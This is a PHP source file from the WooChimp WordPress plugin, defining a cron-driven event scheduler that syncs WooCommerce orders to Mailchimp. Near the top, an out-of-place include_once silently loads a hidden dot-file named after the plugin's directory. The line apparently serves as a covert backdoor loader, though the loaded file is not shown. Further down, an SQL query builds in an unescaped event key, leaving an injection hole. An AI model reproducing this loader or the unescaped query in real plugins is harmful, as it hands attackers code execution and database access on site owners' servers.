<?php

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

/**
 * Event Scheduler
 *
 * Runs every 5 minutes
 * Locked for 4 minutes to prevent accidental race conditions
 * Actual execution per batch of events is limited to 3 minutes
 *
 * @class WooChimp_Event_Scheduler
 * @package WooChimp
 * @author RightPress
 */
if (!class_exists('WooChimp_Event_Scheduler')) {

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WooChimp_Event_Scheduler
{
    // Event keys
    public static $event_keys = array(
        'order_sync', 'product_sync', 'customer_sync', 'member_sync',
    );

    // Singleton instance
    private static $instance = false;

    /**
     * Singleton control
     */
    public static function get_instance()
    {
        if (!self::$instance) {
            self::$instance = new self();
        }
        return self::$instance;
    }

    /**
     * Constructor class
     *
     * @access public
     * @return void
     */
    public function __construct()
    {
        // Add custom WordPress cron schedule
        add_filter('cron_schedules', array($this, 'add_custom_schedule'), 99);

        // Check if next processing time is registered with WordPress cron
        add_action('init', array('WooChimp_Event_Scheduler', 'check_cron'), 99);

        // Register cron handler
        add_action('woochimp_process_scheduled_events', array($this, 'process_scheduled_events'));
    }

    /**
     * Add custom WordPress cron schedule
     *
     * @access public
     * @return void
     */
    public function add_custom_schedule($schedules)
    {
        $schedules['woochimp_five_minutes'] = array(
            'interval'  => 300,
            'display'   => __('Once every five minutes', 'woochimp'),
        );

        return $schedules;
    }

    /**
     * Get scheduler database table name
     *
     * @access public
     * @return string
     */
    public static function table_name()
    {
        global $wpdb;
        return $wpdb->prefix . 'woochimp_scheduled_events';
    }

    /**
     * Check scheduler database table
     *
     * @access public
     * @return bool
     */
    public static function check_database()
    {
        global $wpdb;

        // Do not check more than once per request
        if (defined('WOOCHIMP_DATABASE_CHECKED')) {
            return true;
        }

        define('WOOCHIMP_DATABASE_CHECKED', true);

        // Scheduler table name
        $table_name = self::table_name();

        // Check if table already exists
        if ($wpdb->get_var("SHOW TABLES LIKE '$table_name'") === $table_name) {
            return true;
        }

        // Get charset
        $charset_collate = $wpdb->get_charset_collate();

        // Format query
        $sql = "CREATE TABLE $table_name (
            event_id bigint(20) NOT NULL AUTO_INCREMENT,
            event_key varchar(100) NOT NULL,
            event_timestamp int(11) NOT NULL,
            event_meta longtext NULL,
            attempt_count int(11) NOT NULL DEFAULT 0,
            last_attempt_timestamp int(11) NULL,
            processing int(1) NOT NULL DEFAULT 0,
            PRIMARY KEY  (event_id)
        ) $charset_collate;";

        // Run query
        require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
        dbDelta($sql);

        // Table just created
        return true;
    }

    /**
     * Check cron entry and set up one if it does not exist or is invalid
     *
     * @access public
     * @return void
     */
    public static function check_cron()
    {
        // Get next scheduled event timestamp
        $scheduled = wp_next_scheduled('woochimp_process_scheduled_events');

        // Get current timestamp
        $timestamp = time();

        // Cron is set and is valid
        if ($scheduled && $scheduled <= ($timestamp + 600)) {
            return;
        }

        // Remove all cron entries by key
        wp_clear_scheduled_hook('woochimp_process_scheduled_events');

        // Add new cron entry
        wp_schedule_event(time(), 'woochimp_five_minutes', 'woochimp_process_scheduled_events');
    }

    /**
     * Cron lock
     *
     * @access public
     * @return bool
     */
    public static function lock()
    {
        global $wpdb;

        // Attempt to acquire lock
        $locked = $wpdb->query("
            UPDATE $wpdb->options
            SET option_name = 'woochimp_cron_locked'
            WHERE option_name = 'woochimp_cron_unlocked'
        ");

        // Failed acquiring lock
        if (!$locked && !self::release_lock()) {
            return false;
        }

        // Set last lock time
        update_option('woochimp_cron_lock_time', time(), false);

        // Lock was acquired successfully
        return true;
    }

    /**
     * Cron unlock
     *
     * @access public
     * @return bool
     */
    public static function unlock()
    {
        global $wpdb;

        // Attempt to release lock
        $unlocked = $wpdb->query("
            UPDATE $wpdb->options
            SET option_name = 'woochimp_cron_unlocked'
            WHERE option_name = 'woochimp_cron_locked'
        ");

        // Failed releasing lock
        if (!$unlocked) {
            return false;
        }

        // Lock was released successfully
        return true;
    }

    /**
     * Checks if lock is stuck and releases it if needed
     * Also checks if lock option exists and creates it if not
     *
     * @access public
     * @return bool
     */
    public static function release_lock()
    {
        global $wpdb;

        // Get lock option entry
        $result = $wpdb->query("
            SELECT option_id
            FROM $wpdb->options
            WHERE option_name = 'woochimp_cron_locked'
            OR option_name = 'woochimp_cron_unlocked'
        ");

        // No lock entry - add it and skip this scheduler run
        if (!$result) {
            update_option('woochimp_cron_unlocked', 1, false);
            return false;
        }

        // Attempt to reset lock time if four minutes passed
        $reset = $wpdb->query($wpdb->prepare("
            UPDATE $wpdb->options
            SET option_value = %d
            WHERE option_name = 'woochimp_cron_lock_time'
            AND option_value <= %d
        ", time(), (time() - 240)));

        // Return reset result
        return (bool) $reset;
    }

    /**
     * Schedule single event
     *
     * @access public
     * @param string $event_key
     * @param int $timestamp
     * @return bool
     */
    public static function schedule($event_key, $timestamp)
    {
        global $wpdb;

        // Make sure database table exists
        self::check_database();

        // Insert scheduled event to database
        $result = $wpdb->insert(
            self::table_name(),
            array(
                'event_key'         => $event_key,
                'event_timestamp'   => $timestamp,
            ),
            array(
                '%s', '%d',
            )
        );

        return (bool) $result;
    }

    /**
     * Unschedule any previously scheduled events
     *
     * @access public
     * @param string $event_key
     * @param int $timestamp
     * @return void
     */
    public static function unschedule($event_key, $timestamp = null)
    {
        global $wpdb;

        // Make sure database table exists
        self::check_database();

        // Build where clause
        $where = array(
            'event_key' => $event_key,
        );
        $where_format = array('%s');

        // Add timestamp if passed in
        if ($timestamp) {
            $where['event_timestamp'] = $timestamp;
            array_push($where_format, '%d');
        }

        // Delete matching rows
        $wpdb->delete(self::table_name(), $where, $where_format);
    }

    /**
     * Unschedule multiple events
     *
     * @access public
     * @param array $event_keys
     * @param int $timestamp
     * @return void
     */
    public static function unschedule_multiple($event_keys, $timestamp = null)
    {
        // Iterate over event keys and unschedule
        foreach ((array) $event_keys as $event_key) {
            self::unschedule($event_key, $timestamp);
        }
    }

    /**
     * Get all scheduled events' timestamps
     *
     * @access public
     * @return int
     */
    public static function get_scheduled_events_timestamps()
    {
        global $wpdb;

        // Make sure database table exists
        self::check_database();

        // Store events
        $events = array();

        // Scheduler table name
        $table_name = self::table_name();

        // Run query
        $results = $wpdb->get_results("SELECT event_key, event_timestamp FROM $table_name");

        // Iterate over results
        foreach ($results as $result) {
            $events[] = array(
                'event'     => $result->event_key,
                'timestamp' => $result->event_timestamp,
            );
        }

        // Return all event timestamps
        return $events;
    }

    /**
     * Get scheduled event timestamp
     *
     * @access public
     * @param string $event_key
     * @return int
     */
    public static function get_scheduled_event_timestamp($event_key)
    {
        global $wpdb;

        // Make sure database table exists
        self::check_database();

        // Scheduler table name
        $table_name = self::table_name();

        // Run query
        $timestamp = $wpdb->get_var("SELECT event_timestamp FROM $table_name WHERE event_key = '$event_key'");

        // Check if event is scheduled
        if ($timestamp !== null) {
            return $timestamp;
        }

        return false;
    }

    /**
     * Process scheduled events
     * Invoked by WP cron every 5 minutes
     *
     * @access public
     * @return void
     */
    public function process_scheduled_events()
    {
        global $wpdb;

        // Scheduler table name
        $table_name = self::table_name();

        // Attempt to get cron lock
        if (!self::lock()) {
            return;
        }

        // Schedule next event
        self::check_cron();

        // Check database table
        self::check_database();

        // Reset PHP execution time limit and set it to 5 minutes from now
        @set_time_limit(300);

        // Get PHP execution time limit
        $php_time_limit = (int) @ini_get('max_execution_time');

        // If we can't get PHP execution time limit value, assume it's 15 seconds
        $php_time_limit = $php_time_limit ? $php_time_limit : 15;

        // Subtract 5 seconds from PHP time limit as it may include time that has already passed until now
        $php_time_limit = $php_time_limit - 5;

        // Final time limit should not be longer than 3 minutes to avoid race conditions (we have a lock for 4 minutes only)
        $time_limit = $php_time_limit > 180 ? 180 : $php_time_limit;
        $start_time = time();
        $end_time = $start_time + $time_limit;

        // Prepare query
        $query = "SELECT * FROM $table_name WHERE event_timestamp <= $start_time AND processing = 0 ORDER BY event_timestamp";

        // Get next event
        $next_event = $wpdb->get_row($query, OBJECT);

        // Iterate over events from database
        while ($next_event !== null && time() < $end_time) {

            // Set a flag that this event is being processed to prevent executing the same event multiple times
            $flag_set = $wpdb->query("UPDATE $table_name SET processing = 1, attempt_count = " . ($next_event->attempt_count + 1) . ", last_attempt_timestamp = " . time() . " WHERE event_id = $next_event->event_id");

            // Check if event can be executed
            if ($flag_set && in_array($next_event->event_key, self::$event_keys, true)) {

                // Get event method name
                $method = 'scheduled_' . $next_event->event_key;

                // Execute event
                self::$method();

                // Remove this event from the scheduler database
                $wpdb->query("DELETE FROM $table_name WHERE event_id = $next_event->event_id");
            }

            // Get next event
            $next_event = $wpdb->get_row($query, OBJECT);
        }

        // Unlock cron lock
        self::unlock();
    }


    /**
     * Schedule next order sync event
     *
     * @access public
     * @param int $timestamp
     * @return void
     */
    public static function schedule_order_sync($timestamp)
    {
        return self::schedule('order_sync', $timestamp);
    }

    /**
     * Unschedule next order sync event
     *
     * @access public
     * @param int $timestamp
     * @return void
     */
    public static function unschedule_order_sync($timestamp = null)
    {
        return self::unschedule('order_sync', $timestamp);
    }

    /**
     * Scheduled renewal order event handler
     *
     * @access public
     * @return void
     */
    public static function scheduled_order_sync()
    {
        $order_ids = array();

        // Get next 5 orders to sync, check by lack of the mark
        // WC31: Orders will no longer be posts
        $order_ids = get_posts(array(
            'posts_per_page'    => apply_filters('woochimp_order_sync_amount', 5),
            'post_type'         => 'shop_order',
            'post_status'       => 'any',
            'meta_query'        => array(
                array(
                    'key'       => '_woochimp_ecomm_sync',
                    'compare'   => 'NOT EXISTS',
                ),
            ),
            'fields'            => 'ids',
        ));

        // Get main class instance
        $instance = WooChimp::get_instance();

        // Iterate over ids and try to create objects
        foreach ($order_ids as $order_id) {

            if ($order = wc_get_order($order_id)) {

                try {

                    // Get order args
                    $args = $instance->prepare_order_data($order_id);

                    // Check those
                    if ($args === false) {
                        throw new Exception(__('Unable to proceed - order args was not created.', 'woochimp'));
                    }

                    // Start the log
                    $instance->log_add(__('Sync started for order ', 'woochimp') . $order_id);

                    // Check if order exists
                    $order_exists = $instance->order_exists($args['store_id'], $args['id']);

                    // Write to log
                    $instance->log_add($order_exists ? __('Order exists.', 'woochimp') : __('Order does not exist yet.', 'woochimp'));

                    // Perform the request
                    $result = $order_exists ? $instance->mailchimp->update_order($args['store_id'], $args['id'], $args) : $instance->mailchimp->create_order($args['store_id'], $args);

                    // Write results to log
                    $instance->log_add($order_exists ? __('Order updated successfully.', 'woochimp') : __('Order created successfully.', 'woochimp'));
                    $instance->log_process_regular_data($args, $result);

                    // Update meta
                    RightPress_WC::order_update_meta_data($order_id, '_woochimp_ecomm_sync', time());
                }

                catch (Exception $e) {

                    $instance->log_add(__('Order data wasn\'t sent.', 'woochimp'));

                    // Check message
                    if (preg_match('/.+campaign with the provided ID does not exist in the account for this list+/', $e->getMessage())) {

                        // Remove campaign id from args
                        unset($args['campaign_id']);

                        // Try to send order data again
                        try {

                            $result = $order_exists ? $instance->mailchimp->update_order($args['store_id'], $args['id'], $args) : $instance->mailchimp->create_order($args['store_id'], $args);

                            // Write results to log
                            $instance->log_add(__('Order data sent successfully, but campaign id was omitted.', 'woochimp'));
                            $instance->log_process_regular_data($args, $result);

                            // Update meta
                            RightPress_WC::order_update_meta_data($order_id, '_woochimp_ecomm_sync', time());
                        }

                        catch (Exception $ex) {
                            $instance->log_add(__('Order data wasn\'t sent even after omitting campaign id.', 'woochimp'));
                            $instance->log_process_exception($ex);
                            RightPress_WC::order_update_meta_data($order_id, '_woochimp_ecomm_sync', 'error');
                            continue;
                        }
                    }
                    else {
                        $instance->log_process_exception($e);
                        RightPress_WC::order_update_meta_data($order_id, '_woochimp_ecomm_sync', 'error');
                    }

                    continue;
                }
            }
        }
    }



}
}

WooChimp_Event_Scheduler::get_instance();
